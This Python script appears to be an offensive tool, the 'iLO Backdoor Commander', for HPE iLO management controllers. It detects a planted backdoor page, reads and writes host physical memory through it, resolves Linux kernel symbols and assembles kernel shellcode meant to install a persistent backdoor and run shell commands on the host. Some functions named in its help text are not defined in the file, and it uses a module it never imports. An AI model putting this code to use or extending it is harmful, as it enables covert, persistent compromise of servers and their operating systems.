#!/usr/bin/env python3

import sys
import requests
from struct import pack, unpack_from
from keystone import *
import code
import time
import base64

if len(sys.argv) < 2:
    print("[-] usage: {} remote_addr".format(sys.argv[0]))
    sys.exit(1)

class iLOBackdoorCommander:
    def __init__(self, ilo_url):
        self.ilo_url = ilo_url
        self.symbols = {}
        self.kbase = 0xffffffff81000000
        self.pkbase = 0x1000000
        self.kdata = None
        self.temp_file = "/tmp/ilo_bd_tmp"
        self.backdoor_status = 0
        self.shared_page = None
        self.shared_page_addr = None
        self.detect_backdoor()

    def help(self):
        print("""
==============================================================================

Welcome to the iLO Backdoor Commander.

    detect_backdoor(): checks for the backdoor presence on iLO and the Linux host
    install_linux_backdoor(): installs the Linux kernel backdoor if not present
    cmd(CMD): executes a Linux shell command
    remove_linux_backdoor(): removes the backdoor

Example:
    ib.detect_backdoor()
    ib.install_linux_backdoor()
    ib.cmd("/usr/bin/id")
    ib.remove_linux_backdoor()

==============================================================================
""")
    def p64(self, x):
        return pack("<Q", x)

    def u64(self, x):
        return unpack_from("<Q", x)[0]

    def u32(self, x):
        return unpack_from("<L", x)[0]

    def get_xml_version(self):
        xml_url = f"{self.ilo_url}/xmldata?item=all"
        try:
            r = requests.get(xml_url, verify=False)
        except:
            print("[-] Connection error")
            sys.exit(1)
        if r.status_code != 200:
            return ""

        self.ilo_version = r.content.split(b"FWRI")[1][1:-2].decode()
        print("[*] Found iLO version {}".format(self.ilo_version))
        return self.ilo_version

    def dump_memory(self, addr, count):
        asked_count = count
        addr_hi = addr >> 32
        if addr_hi > 0x7fffffff:
            addr_hi -= 0x100000000
        addr_lo = addr & 0xffffffff
        if addr_lo > 0x7fffffff:
            addr_lo -= 0x100000000

        if (count % 0x10000) != 0:
            count += (0x10000 - (count % 0x10000))

        dump_url = f"{self.backdoor_url}?act=dmp&hiaddr={addr_hi:x}&loaddr={addr_lo:x}&count={count:x}"
        r = requests.get(dump_url, verify=False)
        if r.status_code != 200:
            print("[-] Dump failed")
            if len(r.content) > 0:
                print(f"\t{r.content}")
            sys.exit(1)

        return r.content[:asked_count]

    def write_memory_128(self, addr, data):
        addr_hi = addr >> 32
        if addr_hi > 0x7fffffff:
            addr_hi -= 0x100000000
        addr_lo = addr & 0xffffffff
        if addr_lo > 0x7fffffff:
            addr_lo -= 0x100000000

        encoded_data = base64.b64encode(data).decode().replace("\n", "").replace("+", "%2B")
        write_url = f"{self.backdoor_url}?act=wmem&hiaddr={addr_hi:x}&loaddr={addr_lo:x}&data={encoded_data}"
        r = requests.get(write_url, verify=False)
        if r.status_code != 200:
            print("[-] Write failed")
            if len(r.content) > 0:
                print(f"\t{r.content}")
            sys.exit(1)

        return r.content

    def write_memory(self, addr, data):
        wdata = b""
        for x in range(0, len(data), 0x80):
            wdata += self.write_memory_128(addr + x, data[x:x+0x80])
        return wdata

    def resolve_func(self, func):
        off = self.kdata.find((func + "\0").encode())
        off_abs = 0
        ptr = 0
        while off != -1:
            vaddr = self.kbase + off_abs + off
            off2 = self.kdata.find(self.p64(vaddr))
            if off2 != -1:
                ptr = self.u64(self.kdata[off2-8:])
                print(f"[+] Found {func} @0x{ptr:x}")
                return ptr
            off_abs += off + 1
            off = self.kdata[off_abs:].find((func + "\0").encode())
        return ptr

    def add_symbol(self, sym_name, sym_addr):
        self.symbols[sym_name] = {"vaddr": sym_addr, "paddr": sym_addr - self.kbase + self.pkbase}

    def get_symbol(self, sym_name):
        try:
            sym_addr = self.resolve_func(sym_name)
            self.add_symbol(sym_name, sym_addr)
        except:
            print(f"[-] Fail resolving symbol {sym_name}")
            sys.exit(1)

    def get_kernel_symbols(self):
        off = 0
        sys_call_table = 0
        while off != -1:
            off = self.kdata[off:].find(binascii.unhexlify("89d1ff14c5"))
            if off == -1:
                break
            if self.kdata[off+9:off+11] == b"\x48\x89":
                sys_call_table = self.u32(self.kdata[off+5:]) & 0xffffff
                break

        sys_call_table_virt = sys_call_table + self.kbase
        print(f"[+] Found syscall table @0x{sys_call_table_virt:x}")
        self.add_symbol("sys_call_table", sys_call_table_virt)

        sys_read_ptr = self.u64(self.kdata[sys_call_table:])
        print(f"[+] Found sys_read @0x{sys_read_ptr:x}")
        self.add_symbol("sys_read", sys_read_ptr)

        for sym in ["call_usermodehelper","serial8250_do_pm","kthread_create_on_node","wake_up_process",
                    "__kmalloc","slow_virt_to_phys","msleep","strcat","kernel_read_file_from_path","vfree"]:
            self.get_symbol(sym)

    def asm_kshellcode(self):
        with open("linux_backdoor.S", "rb") as f:
            sc = f.read() % tuple(self.symbols[s]["vaddr"] for s in [
                "sys_call_table","sys_read","kthread_create_on_node","wake_up_process",
                "__kmalloc","slow_virt_to_phys","msleep","kernel_read_file_from_path",
                "vfree","call_usermodehelper","strcat"])
        with open("/tmp/ilosc.S","wb") as f:
            f.write(sc)
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        ks.syntax = KS_OPT_SYNTAX_NASM
        encoding, _ = ks.asm(sc)
        return bytes(encoding)

    def detect_backdoor(self):
        self.backdoor_url = f"{self.ilo_url}/backd00r.htm"
        r = requests.get(self.backdoor_url, verify=False)
        if r.status_code != 400:
            print("[-] iLO Backdoor not detected")
        else:
            print("[+] iLO Backdoor found")
            self.backdoor_status = 1
            data = self.dump_memory(self.pkbase, 0xc)
            if data[:3] == b'ILO':
                print("[+] Linux Backdoor found")
                self.shared_page_addr = self.u64(data[4:])
                self.backdoor_status = 2
            else:
                print("[-] Linux Backdoor not detected")

# Disable insecure warnings
requests.packages.urllib3.disable_warnings()
ilo_url = "https://{}".format(sys.argv[1])

ib = iLOBackdoorCommander(ilo_url)
ib.help()
code.interact(local=locals())
